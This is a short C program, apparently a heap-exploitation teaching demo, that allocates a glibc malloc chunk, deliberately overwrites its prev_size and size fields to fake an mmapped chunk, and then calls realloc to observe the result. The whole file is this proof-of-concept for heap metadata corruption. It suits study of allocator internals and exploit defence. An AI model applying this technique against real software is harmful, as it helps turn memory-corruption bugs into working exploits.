#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define PREV_INUSE 0x1
#define IS_MMAPPED 0x2

typedef size_t INTERNAL_SIZE_T;

struct malloc_chunk {
    INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
    INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

    struct malloc_chunk* fd;         /* double links -- used only if free. */
    struct malloc_chunk* bk;

    /* Only used for large blocks: pointer to next larger size.  */
    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
    struct malloc_chunk* bk_nextsize;
};

typedef struct malloc_chunk* mchunkptr;

int main(int argc, const char* argv[]) {
    void *mem = malloc(0x400);
    mchunkptr victim = (mchunkptr)((char*)mem - offsetof(struct malloc_chunk, fd));
    printf("allocated victim chunk with requested size 0x400 at %p,  " \
           "victim->size == 0x%zx\n", mem, victim->size);
    void *border = malloc(0x400);
    printf("allocated another chunk at %p, so that victim won't simply be grown " \
           " from top \n", border);

    printf("emulating corruption of prev_size and size of victim\n");
    victim->prev_size = 0; 
    victim->size = 0x2000 | IS_MMAPPED;

    printf("reallocating victim with size 0x1600\n");
    void *mem2 = realloc(mem, 0x1600);

    printf("realloc returned: %p\n", mem2);
    return 0;
}
